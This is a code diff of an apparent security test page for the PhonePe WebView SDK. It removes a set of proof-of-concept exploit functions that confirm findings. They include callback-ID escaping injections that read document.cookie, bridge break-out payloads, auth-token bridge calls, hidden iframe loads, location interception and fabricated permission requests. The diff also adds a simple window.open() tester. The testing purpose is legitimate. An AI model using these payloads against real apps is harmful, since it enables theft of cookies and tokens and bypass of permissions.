@@ -79,7 +79,7 @@
   <button onclick="closeApp()">Close App Bridge Method</button>
 
 
-  <h2>Embedded Website</h2>
+  <!-- <h2>Embedded Website</h2>
 <div style="max-width: 1000px; margin: 20px auto;">
   <iframe
     src="https://jupiter.0xc3.pw/hiteshkumarthakur.github.io/"
@@ -91,7 +91,7 @@
     referrerpolicy="no-referrer-when-downgrade"
     allowfullscreen>
   </iframe>
-</div>
+</div> -->
 
 
 <div class="settings-section" style="border-color:orange;">
@@ -807,260 +807,27 @@ function handleCameraData(cameraData) {
     <div class="status-box" id="m05Status">—</div>
   </div>
 
+  <div class="settings-section" style="border-color: #007bff;">
+    <h3 style="color: #007bff;">window.open() with Custom URL</h3>
+    <p>Enter a URL and open it in a new tab/window using <code>window.open()</code>.</p>
+    <input type="text" id="windowOpenUrlInput" placeholder="https://example.com" style="width:100%; padding:8px; box-sizing:border-box; margin-bottom:8px; border:1px solid #ccc; border-radius:4px;">
+    <button class="btn" onclick="openCustomUrl('_blank')">Open in New Tab</button>
+    <button class="btn" onclick="openCustomUrl('_self')">Open in Same Tab</button>
+    <button class="btn" onclick="openCustomUrl('_blank', 'width=600,height=600')">Open as Popup (600x600)</button>
+    <div class="status-box" id="windowOpenCustomStatus">—</div>
+  </div>
+
   <script>
-    // ── C-01 ──────────────────────────────────────────────────────────────────
-    function c01_createSensitiveCookies() {
-      document.cookie = "session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test; path=/; max-age=86400";
-      document.cookie = "auth_cookie=AUTH_SECRET_VALUE_12345; path=/; max-age=86400";
-      document.cookie = "payment_session=PAY_SESSION_TOKEN_ABC; path=/; max-age=3600";
-      document.cookie = "user_id=U2309121406122578983257; path=/; max-age=86400";
-      document.getElementById('c01Status').textContent =
-        'Cookies created. Now: Xcode → Window → Devices → Download Container → AppData/Documents/PhonePeWebView/Cookies/ → open .plist in TextEdit to see plaintext values.';
-    }
-
-    function c01_showCookies() {
-      var cookies = document.cookie;
-      document.getElementById('c01Status').textContent =
-        cookies ? 'Current cookies:\n' + cookies.split(';').join('\n') : 'No JS-readable cookies found.';
-      if (cookies) alert('C-01 Cookies:\n\n' + cookies.split(';').map(c => c.trim()).join('\n'));
-    }
-
-    // ── C-02 ──────────────────────────────────────────────────────────────────
-    // jsString(for:) in PhonePeWebViewJSEvaluator only escapes ' → \'
-    // A leading \ cancels the escape: \' becomes \\' which is: backslash + end-of-string
-    // The rest of the payload executes as free JavaScript.
-    function c02_backslashInjection() {
-      document.getElementById('c02Status').textContent = 'Sent. Watch for alert() popup — if it fires, C-02 injection is confirmed.';
-      var maliciousCallbackId = "\\'; alert('C02_INJECTED: ' + document.cookie); //";
-      window.webkit.messageHandlers.getCurrentLocation.postMessage({
-        "scriptName": "getCurrentLocation",
-        "callbackId": maliciousCallbackId
-      });
-    }
-
-    function c02_newlineInjection() {
-      document.getElementById('c02Status').textContent = 'Sent. Watch for alert() — if it fires, newline injection is confirmed.';
-      var newlinePayload = "legit_id\n'; alert('C02_NEWLINE_INJECTED'); //";
-      window.webkit.messageHandlers.getCurrentLocation.postMessage({
-        "scriptName": "getCurrentLocation",
-        "callbackId": newlinePayload
-      });
-    }
-
-    // ── C-03 ──────────────────────────────────────────────────────────────────
-    // Custom bridge builds: callbackId(response) and evaluates it verbatim.
-    // Injecting ); code; ( breaks out of the function call.
-    function c03_titleProbe() {
-      window.webkit.messageHandlers.CUSTOMTEST.postMessage({
-        "scriptName": "CUSTOMTEST",
-        "callbackId": "injected); document.title='C03_PWNED'; (",
-        "data": {}
-      });
-      setTimeout(function() {
-        var confirmed = document.title === 'C03_PWNED';
-        document.getElementById('c03Status').textContent = confirmed
-          ? '⚠️ CONFIRMED: document.title changed to "C03_PWNED" — raw JS injection via custom bridge.'
-          : 'Title is "' + document.title + '". Check bridge name matches your CustomBridge registration.';
-      }, 600);
-    }
-
-    function c03_cookieAlert() {
-      window.webkit.messageHandlers.CUSTOMTEST.postMessage({
-        "scriptName": "CUSTOMTEST",
-        "callbackId": "x); alert('C03_COOKIES: ' + document.cookie); (",
-        "data": {}
-      });
-      document.getElementById('c03Status').textContent = 'Sent. If alert fires with cookies, C-03 is confirmed.';
-    }
-
-    // ── C-04 ──────────────────────────────────────────────────────────────────
-    // AUTH is in universalBridge — permission check returns true for every whitelisted domain.
-    // Scripts are currently stubbed (break) so no data returns, but the permission gate passes.
-    // To fully confirm: temporarily un-stub fetchAuthToken in PhonePeWebViewBridgeHandler.swift.
-    function c04_fetchAuthToken() {
-      document.getElementById('c04Status').textContent = 'Sent fetchAuthToken. Any response (even error) = permission check passed = C-04 confirmed.';
-      window.webkit.messageHandlers.fetchAuthToken.postMessage({
-        "scriptName": "fetchAuthToken",
-        "callbackId": "c04_auth_" + Date.now(),
-        "data": {}
-      });
-    }
-
-    function c04_fetchGrantToken() {
-      document.getElementById('c04Status').textContent = 'Sent fetchGrantToken. Any response = C-04 confirmed.';
-      window.webkit.messageHandlers.fetchGrantToken.postMessage({
-        "scriptName": "fetchGrantToken",
-        "callbackId": "c04_grant_" + Date.now(),
-        "data": {}
-      });
-    }
-
-    // ── H-02 ──────────────────────────────────────────────────────────────────
-    // NavigationRequestHandler returns .allow for all sub-frames before any domain check.
-    function h02_iframeLoad() {
-      var f = document.createElement('iframe');
-      f.src = 'https://httpbin.org/get?exploit=H02_iframe_test';
-      f.style.width = '1px';
-      f.style.height = '1px';
-      f.style.position = 'absolute';
-      f.style.opacity = '0';
-      f.onload = function() {
-        document.getElementById('h02Status').textContent =
-          '⚠️ CONFIRMED: iframe to httpbin.org loaded successfully. SDK performed zero sub-frame domain validation.';
-      };
-      f.onerror = function() {
-        document.getElementById('h02Status').textContent = 'iframe blocked or network error (may be mitigated).';
-      };
-      document.body.appendChild(f);
-      document.getElementById('h02Status').textContent = 'iframe injected pointing to httpbin.org (not whitelisted) — waiting for load event...';
-    }
-
-    // ── H-03 ──────────────────────────────────────────────────────────────────
-    // CLLocation.dictionaryRepresentation() returns full precision — no rounding.
-    function h03_interceptLocation() {
-      document.getElementById('h03Status').textContent = 'Intercepting location callback...';
-      // Monkey-patch the callback to log the raw data before passing through
-      if (window.PhonePe && window.PhonePe.MessagingHandler) {
-        var origCb = window.PhonePe.MessagingHandler.callback;
-        window.PhonePe.MessagingHandler.callback = function(id, resolved, data, err) {
-          if (id === 'h03_loc') {
-            var parsed = typeof data === 'string' ? data : JSON.stringify(data);
-            document.getElementById('h03Status').textContent =
-              '⚠️ FULL LOCATION DATA (no rounding): ' + parsed;
-            alert('H-03 Location Data:\n' + parsed);
-            window.PhonePe.MessagingHandler.callback = origCb; // restore
-          }
-          origCb(id, resolved, data, err);
-        };
+    function openCustomUrl(target, features) {
+      var url = document.getElementById('windowOpenUrlInput').value.trim();
+      if (!url) {
+        document.getElementById('windowOpenCustomStatus').textContent = 'Please enter a URL first.';
+        return;
       }
-      window.webkit.messageHandlers.getCurrentLocation.postMessage({
-        "scriptName": "getCurrentLocation",
-        "callbackId": "h03_loc"
-      });
-    }
-
-    // ── H-04 ──────────────────────────────────────────────────────────────────
-    // seekCameraPermission() calls PHPhotoLibrary.authorizationStatus() — not camera.
-    function h04_cameraPermission() {
-      document.getElementById('h04Status').textContent = 'Permission dialog triggered. Watch the iOS system dialog — it should say "Photos" not "Camera".';
-      sdk.seekPermission([PhonePe.Constants.Permission.CAMERA]).then(function(data) {
-        document.getElementById('h04Status').textContent =
-          'Response: ' + JSON.stringify(data) + '\nCheck: was it a Photos dialog or a Camera dialog?';
-      }).catch(function(err) {
-        document.getElementById('h04Status').textContent = 'Error: ' + err;
-      });
-    }
-
-    // ── H-06 ──────────────────────────────────────────────────────────────────
-    // logPageLoadEvent() passes raw URL (no query stripping) to analyticsProvider.sendEvent.
-    function h06_navigateWithToken() {
-      document.getElementById('h06Status').textContent =
-        'Navigating. Check Xcode breakpoint at PhonePeWebViewNavigationDelegate.swift:259 — run "po url?.absoluteString" to see token in analytics payload.';
-      window.location.href =
-        'https://mohsin-khan-phonepe.github.io/phonepe-test-site?token=SECRET_TOKEN_EXFIL&session=SESSION_ABC_456&order_id=ORD_789_SENSITIVE';
-    }
-
-    // ── H-07 ──────────────────────────────────────────────────────────────────
-    // decideMediaCapturePermissionsFor ignores WKMediaCaptureType — grants everything.
-    function h07_audioOnly() {
-      navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-        .then(function(stream) {
-          var tracks = stream.getTracks().map(function(t) { return t.kind; }).join(', ');
-          document.getElementById('h07Status').textContent =
-            'Step 1 — Audio-only request → tracks granted: [' + tracks + ']. Now click Step 2.';
-        })
-        .catch(function(e) {
-          document.getElementById('h07Status').textContent = 'Audio denied: ' + e.message;
-        });
-    }
-
-    function h07_videoOnly() {
-      navigator.mediaDevices.getUserMedia({ audio: false, video: true })
-        .then(function(stream) {
-          var tracks = stream.getTracks().map(function(t) { return t.kind; }).join(', ');
-          document.getElementById('h07Status').textContent =
-            '⚠️ CONFIRMED — Step 2 video-only request also granted: [' + tracks + ']. SDK does not check WKMediaCaptureType.';
-        })
-        .catch(function(e) {
-          document.getElementById('h07Status').textContent = 'Video denied (possibly mitigated): ' + e.message;
-        });
-    }
-
-    // ── H-08 ──────────────────────────────────────────────────────────────────
-    // PhonePeWebViewPermissionManager guard: unknown rawValue → approves with permissionGranted: true
-    function h08_fakePermissions() {
-      document.getElementById('h08Status').textContent = 'Sending fabricated permissions...';
-
-      // Intercept the next MessagingHandler callback to capture the response
-      if (window.PhonePe && window.PhonePe.MessagingHandler) {
-        var origCb = window.PhonePe.MessagingHandler.callback;
-        var probeId = 'h08_probe_' + Date.now();
-        window.PhonePe.MessagingHandler.callback = function(id, resolved, data, err) {
-          if (id === probeId) {
-            var parsed = typeof data === 'string' ? data : JSON.stringify(data);
-            document.getElementById('h08Status').textContent =
-              '⚠️ Response for fabricated permissions: ' + parsed +
-              '\nIf all show permissionGranted:true — H-08 confirmed.';
-            alert('H-08 Permission Response:\n' + parsed);
-            window.PhonePe.MessagingHandler.callback = origCb;
-          }
-          origCb(id, resolved, data, err);
-        };
-
-        window.webkit.messageHandlers.seekPermission.postMessage({
-          "scriptName": "seekPermission",
-          "callbackId": probeId,
-          "data": {
-            "permissions": [
-              "IMAGE_FILES",
-              "SUPER_ADMIN_ACCESS",
-              "BYPASS_PAYMENT_GATE",
-              "FREE_PREMIUM"
-            ]
-          }
-        });
-      } else {
-        document.getElementById('h08Status').textContent = 'PhonePe.MessagingHandler not found — SDK may not be initialized yet.';
-      }
-    }
-
-    // ── M-03 ──────────────────────────────────────────────────────────────────
-    // javaScriptCanOpenWindowsAutomatically: true in CRISP config.
-    function m03_autoWindowOpen() {
-      document.getElementById('m03Status').textContent = 'Will call window.open in 2s with no user gesture...';
-      setTimeout(function() {
-        var w = window.open('https://www.reddit.com', '_blank');
-        document.getElementById('m03Status').textContent = w
-          ? '⚠️ CONFIRMED: Auto window.open ALLOWED — new WebView opened without user interaction.'
-          : 'Auto window.open BLOCKED ✅ (javaScriptCanOpenWindowsAutomatically may be false).';
-      }, 2000);
-    }
-
-    // ── M-05 ──────────────────────────────────────────────────────────────────
-    // trapUrls[1] = "www.google.com" — plain string used as NSRegularExpression pattern.
-    // The . matches any char, so www-google-com.evil.io matches and triggers onTrapUrlHit.
-    function m05_falsePositive() {
-      document.getElementById('m05Status').textContent =
-        'Navigating to a URL that is NOT google.com but matches the unescaped regex "www.google.com".\n' +
-        'If SDK fires onTrapUrlHit and cancels navigation — M-05 false positive confirmed.';
-      // The dots in "www.google.com" match any character, so this URL matches the pattern
-      window.location.href = 'https://wwwXgoogleYcom.example.com/m05-test';
-    }
-
-    function m05_rapidNavigation() {
-      document.getElementById('m05Status').textContent =
-        'Injecting 10 iframes rapidly. Watch Xcode Debug Navigator → CPU for spikes caused by repeated NSRegularExpression compilation per navigation.';
-      for (var i = 0; i < 10; i++) {
-        (function(idx) {
-          setTimeout(function() {
-            var f = document.createElement('iframe');
-            // Each iframe navigation causes both trapUrl patterns to be recompiled fresh
-            f.src = 'https://httpbin.org/get?m05_rapid=' + idx;
-            f.style.display = 'none';
-            document.body.appendChild(f);
-          }, idx * 150);
-        })(i);
-      }
+      var w = window.open(url, target, features || '');
+      document.getElementById('windowOpenCustomStatus').textContent = w
+        ? 'window.open() called → target: ' + target + ' | url: ' + url
+        : 'window.open() was BLOCKED by the browser/webview.';
     }
   </script>
   <!-- ===================== END SECURITY EXPLOIT TESTS ===================== -->
